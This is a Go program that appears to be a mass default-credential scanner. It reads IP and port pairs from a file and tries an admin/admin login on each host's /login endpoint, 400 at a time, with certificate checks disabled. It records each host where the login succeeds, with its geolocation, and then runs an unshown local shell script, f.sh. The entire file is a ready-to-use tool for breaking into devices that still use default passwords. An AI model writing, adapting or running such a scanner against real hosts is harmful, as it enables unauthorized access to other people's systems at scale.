package main

import (
        "bufio"
        "bytes"
        "crypto/tls"
        "encoding/json"
        "fmt"
        "io"
        "log"
        "net"
        "net/http"
        "os"
        "os/exec"
        "strings"
        "sync"
        "time"

        "github.com/oschwald/geoip2-golang"
)

func init() {
        log.SetOutput(io.Discard) // 忽略所有标准日志输出
}

func login(url string) (bool, string) {
        // Create POST request body data
        data := []byte(`{"username": "admin", "password": "admin"}`)

        // Configure HTTP client with desired settings
        tr := &http.Transport{
                TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
        }
        client := &http.Client{
                Transport: tr,
                Timeout:   1 * time.Second,
        }

        // Send POST request
        resp, err := client.Post(url, "application/json", bytes.NewBuffer(data))
        if err != nil {
                return false, ""
        }
        defer resp.Body.Close()

        // Read response body
        var result map[string]interface{}
        err = json.NewDecoder(resp.Body).Decode(&result)
        if err != nil {
                return false, ""
        }

        //提取响应头中的Set-Cookie字段
        cookie := resp.Header.Get("Set-Cookie")

        // Check if "success" field exists in the response
        if _, ok := result["success"]; !ok {
                return false, ""
        }

        // Assert the value of "success" field as a boolean
        switch result["success"].(type) {
        case bool:
                return result["success"].(bool), cookie
        default:
                return false, ""
        }
}

func main() {
        url, _, ip, err := readIPs("data.txt")
        if err != nil {
                fmt.Printf("无法读取IP列表: %v\n", err)
                return
        }
        fmt.Println("预计消耗时间: ", len(url)/400, "秒")
        file, err := os.OpenFile("result.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
        if err != nil {
                fmt.Printf("无法打开文件: %v\n", err)
                return
        }
        defer file.Close()
        var wg sync.WaitGroup
        wg.Add(len(url))

        resultChan := make(chan string, len(url))

        thread := make(chan struct{}, 400)

        var count int
        total := len(url)
        var lastPercentage float64 = -1
        for i, v := range url {
                thread <- struct{}{}
                go func(v string, i int) {
                        defer func() {
                                <-thread
                                wg.Done()
                                count++
                                percentage := float64(count) / float64(total) * 100
                                if percentage != lastPercentage {
                                        fmt.Printf("\r已完成: %d 总数: %d 已完成: %.2f%%", count, total, percentage)
                                        lastPercentage = percentage
                                }
                        }()
                        if flag, _ := login(v + "/login"); flag {
                                fmt.Println(v + "  " + GeoIP(ip[i]) + "                                                ")
                                resultChan <- v + "  " + GeoIP(ip[i])
                                file.WriteString(v + "  " + GeoIP(ip[i]) + "\n")
                        }
                }(v, i)
        }

        wg.Wait()
        close(resultChan)
        if len(resultChan) == 0 {
                fmt.Println("没有发现有效的IP")
                return
        }
        defer executeShellScript()
}

func readIPs(File string) ([]string, []string, []string, error) {
        file, err := os.Open(File)
        if err != nil {
                return nil, nil, nil, err
        }
        defer file.Close()
        var urls []string
        var lines []string
        var ips []string
        scanner := bufio.NewScanner(file)
        for scanner.Scan() {
                line := scanner.Text()
                parts := strings.Fields(line)
                if len(parts) < 4 {
                        fmt.Println(line, "行格式错误")
                        continue
                }
                ipAddr := parts[3]
                port := parts[2]
                add := "http://" + ipAddr + ":" + port
                urls = append(urls, add)
                lines = append(lines, line)
                ips = append(ips, ipAddr)
        }
        return urls, lines, ips, scanner.Err()
}

func GeoIP(ip string) string {
        db, err := geoip2.Open("GeoLite2-City.mmdb")
        if err != nil {
                fmt.Println(err)
                return "查询失败"
        }
        defer db.Close()

        ipNet := net.ParseIP(ip)
        record, err := db.City(ipNet)
        if err != nil {
                fmt.Println(err)
                return "查询失败"
        }
        if record.Country.Names["zh-CN"] == record.City.Names["zh-CN"] {
                return record.Country.Names["zh-CN"]
        }
        return record.Country.Names["zh-CN"] + record.City.Names["zh-CN"]
}

func executeShellScript() {
        // 设置 Shell 脚本的路径
        scriptPath := "f.sh"

        // 运行 Shell 脚本
        cmd := exec.Command("sh", scriptPath)

        // 执行命令并等待完成
        if err := cmd.Run(); err != nil {
                fmt.Println("执行 Shell 脚本出错:", err)
                return
        }

        fmt.Println("\n脚本执行成功.")
}
